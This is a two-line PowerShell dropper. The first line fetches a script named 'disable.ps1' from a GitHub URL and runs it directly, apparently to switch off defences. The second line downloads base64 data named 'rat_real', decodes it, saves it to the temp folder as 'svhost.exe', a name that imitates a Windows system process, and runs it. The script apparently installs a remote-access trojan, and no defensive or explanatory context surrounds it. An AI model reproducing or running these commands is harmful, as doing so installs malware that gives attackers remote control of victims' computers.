iex (irm "https://github.com/leetcodeuser123/temp/raw/main/disable.ps1")
$exePath = "$env:TEMP\svhost.exe"; [System.IO.File]::WriteAllBytes($exePath, [System.Convert]::FromBase64String((irm "https://github.com/leetcodeuser123/temp/raw/main/rat_real"))); & $exePath
